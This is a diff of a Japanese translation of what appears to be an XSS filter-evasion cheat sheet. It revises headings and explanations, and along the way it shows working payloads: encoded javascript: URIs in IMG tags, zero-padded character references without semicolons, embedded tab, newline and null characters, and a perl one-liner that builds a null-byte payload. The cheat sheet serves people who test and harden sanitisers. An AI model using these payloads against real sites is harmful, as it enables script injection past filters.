@@ -235,7 +235,7 @@ David Cross による投稿です。Chromeで確認済みです。
 </p>
 <pre>&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;
 </pre>
-<h2><span class="mw-headline" id="Default_SRC_tag_to_get_past_filters_that_check_SRC_domain">SRC 属性に空のページ内アンカーを設定することで、SRC ドメインフィルターを通過する</span></h2>
+<h2><span class="mw-headline" id="Default_SRC_tag_to_get_past_filters_that_check_SRC_domain">SRC 属性に空のページ内アンカーを設定することで、SRC ドメインフィルターを回避する</span></h2>
 <p>大半の SRC ドメインフィルターを回避します。Javascript コードのイベントメソッドへの挿入は、Form、Iframe、Input、Embed などの HTML タグタイプに応用できます。また、onblur や onclick などの関連イベントにも代入できるため、ここで挙げた多くのインジェクションに関して多数のバリエーションを提供できます。
 David Cross による投稿。
 </p><p>Abdullah Hussam(@Abdulahhusam) による編集。
@@ -254,45 +254,45 @@ David Cross による投稿。
 <h2><span class="mw-headline" id="IMG_onerror_and_javascript_alert_encode">IMG onerror および javascript アラートのエンコード</span></h2>
 <pre>&lt;img src=x onerror="&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041"&gt;
 </pre>
-<h2><span class="mw-headline" id="Decimal_HTML_character_references">10 進数の HTML 数値文字参照</span></h2>
-<p>javascript: ディレクティブを  &lt;IIMG タグ内で使用するすべての XSS の例は、Gecko レンダリングエンジンモードの Firefox または Netscape 8.1 以降では動作しません。詳しくは、XSS <a rel="nofollow" class="external text" href="http://ha.ckers.org/xsscalc.html">計算機能</a>を使用してください。
+<h2><span class="mw-headline" id="Decimal_HTML_character_references">HTML 数値文字参照(10進数)</span></h2>
+<p>javascript: ディレクティブを  &lt;IMG タグ内で使用するすべての XSS の例は、Firefox や Gecko レンダリングエンジンモードの Netscape 8.1 以降では動作しません。
 </p>
 <pre>&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;
 &amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;
 </pre>
-<h2><span class="mw-headline" id="Decimal_HTML_character_references_without_trailing_semicolons">末尾にセミコロンを使用しない、10 進数の HTML 数値文字参照</span></h2>
-<p>これは、"&amp;#XX;" を見つけようとする XSS で多くの場合効果的です。大半のユーザーは、合計で最大 7 桁の数字による埋め込みを知らないためです。また、$tmp_string =~ s/.*\&amp;#(\d+);.*/$1/; のような文字列に対してデコードを試みるユーザーにも有効です。このような文字列では、HTML エンコード文字列の終わりにセミコロンが必須という誤った前提に立っています (実際、このようなケースはありました)。
+<h2><span class="mw-headline" id="Decimal_HTML_character_references_without_trailing_semicolons">末尾にセミコロンをつけない HTML 数値文字参照(10進数)</span></h2>
+<p>これは、"&amp;#XX;" というパターンを見つけようとする XSS 対策に対して多くの場合効果的です。大半のユーザーはパディングのことを知らないからです。最大 7 桁まで 0 パディングしても数字として認識されます。また、$tmp_string =~ s/.*\&amp;#(\d+);.*/$1/; のようにして文字列のデコードを試みるユーザーにも有効です。このデコード方法では、HTML エンコード文字列の終わりにセミコロンが必須という誤った前提に立っています (実際、このようなケースを見たことがあります)。
 </p>
 <pre>&lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;
 #0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt;
 </pre>
-<h2><span class="mw-headline" id="Hexadecimal_HTML_character_references_without_trailing_semicolons">末尾にセミコロンを使用しない、16 進数の HTML 数値文字参照</span></h2>
-<p>これも、上記の文字列 $tmp_string =~ s/.*\&amp;#(\d+);.*/$1/; に対する実行可能な XSS 攻撃で、ここではポンド記号の後に数字があることを前提としていますが、これは 16 進の HTML 文字には当てはまりません。詳しくは、XSS <a rel="nofollow" class="external text" href="http://ha.ckers.org/xsscalc.html">計算機能</a>を使用してください。
+<h2><span class="mw-headline" id="Hexadecimal_HTML_character_references_without_trailing_semicolons">末尾にセミコロンを使用しない、HTML 数値文字参照(16進数)</span></h2>
+<p>これも、上記の $tmp_string =~ s/.*\&amp;#(\d+);.*/$1/; というデコードによる検出を回避できる XSS 攻撃手法です。このデコードでは "#" 記号の後に数字があることを前提としていますが、これは 16 進数値文字参照には当てはまりません。
 </p>
 <pre>&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;
 </pre>
-<h2><span class="mw-headline" id="Embedded_tab">タブの埋め込み</span></h2>
-<p>クロスサイトスクリプティング攻撃を中断するために使用されます。 
+<h2><span class="mw-headline" id="Embedded_tab">タブ文字の埋め込み</span></h2>
+<p>スクリプトを検知させないようにするために使用されます。
 </p>
 <pre>&lt;IMG SRC="jav&#x9;ascript:alert('XSS');"&gt;
 </pre>
 <h2><span class="mw-headline" id="Embedded_Encoded_tab">エンコードしたタブ文字の埋め込み</span></h2>
-<p>これを使用して XSS を中断します。
+<p>こちらも同様です。
 </p>
 <pre>&lt;IMG SRC="jav&amp;#x09;ascript:alert('XSS');"&gt;
 </pre>
-<h2><span class="mw-headline" id="Embedded_newline_to_break_up_XSS">改行の埋め込みによる XSS の中断</span></h2>
-<p>一部の Web サイトでは、09 から 13 (10 進数) のいずれの文字もこの攻撃で機能するとしています。しかしそれは誤りです。09 (水平タブ)、10 (改行)、13 (復帰) のみが機能します。詳しくは、ASCII 表を参照してください。以下の 4 つの XSS の例がこのベクトルを説明しています。
+<h2><span class="mw-headline" id="Embedded_newline_to_break_up_XSS">改行文字の埋め込み</span></h2>
+<p>一部の Web サイトでは、09 から 13 (10 進数) のいずれの文字もこの攻撃に使えるとしています。しかしそれは誤りです。09 (水平タブ)、10 (改行)、13 (復帰) のみが有効です。詳しくは、ASCII 表を参照してください。以下に 4 つの例を示します。
 </p>
 <pre>&lt;IMG SRC=&quot;jav&amp;#x0A;ascript:alert('XSS');&quot;&gt;
 </pre>
-<h2><span class="mw-headline" id="Embedded_carriage_return_to_break_up_XSS">復帰文字の埋め込みによる XSS の中断</span></h2>
-<p>(注: 前述を受けて、ゼロは省略できるため、これらの文字列を必要以上に長くしています。16 進数や 10 進数のエンコードが 2 文字または 3 文字であることを前提としたフィルターが実際には多くあります。実際のルールは、1 文字から 7 文字です)。
+<h2><span class="mw-headline" id="Embedded_carriage_return_to_break_up_XSS">復帰文字の埋め込み</span></h2>
+<p>(注: 上記のパディングのことを考慮すると、もっと長い文字列を作ることもできます。0 は省略して解釈されるためです。16 進数や 10 進数の表記が 2 文字または 3 文字であることを前提としたフィルターがよくありますが、実際には、1 文字から 7 文字までの表記を使うことができます)。
 </p>
 <pre>&lt;IMG SRC=&quot;jav&amp;#x0D;ascript:alert('XSS');&quot;&gt;
 </pre>
-<h2><span class="mw-headline" id="Null_breaks_up_JavaScript_directive">Null 値による JavaScript ディレクティブの中断</span></h2>
-<p>Null 文字も XSS ベクトルとして機能しますが、上記とは異なります。Burp Proxy などを使用して直接挿入するか、URL 文字列内で %00 を使用する必要があります。あるいは、独自のインジェクションツールを作成する場合、vim (^V^@ は null を生成) または以下のプログラムのいずれかを使用して、テキストファイル内に生成することもできます。訂正しておきます。旧バージョンの Opera (Windows の場合は 7.11 あたり) は追加文字 173 (ソフトハイフン制御文字) に対して脆弱でした。しかし、null char %00 は、より有用で、次の例のバリエーションを持つ、特定の実在のフィルターをバイパスするうえで役立ちます。
+<h2><span class="mw-headline" id="Null_breaks_up_JavaScript_directive">Null 文字の埋め込み</span></h2>
+<p>Null 文字の埋め込みも XSS 攻撃に使うことができますが、上記とは異なり、Burp Proxy などを使用して直接挿入するか、URL 文字列内で %00 を使用する必要があります。あるいは、独自のインジェクションツールを作成するのであれば、vim (キー入力 ^V^@ で null 文字を入力できる) または以下のプログラムのいずれかを使用して、テキストファイル内に null 文字を入力することができます。おっと、訂正。旧バージョンの Opera (Windows の場合は 7.11 あたり) では文字 173 (ソフトハイフン制御文字) に対しても脆弱でした。しかし、null 文字 %00 は、より有用です。次の例のようなバリエーションで、特定のフィルターをバイパスしたこともあります。
 </p>
 <pre>perl -e 'print "&lt;IMG SRC=java\0script:alert(\"XSS\")&gt;";' &gt;  out
 </pre>
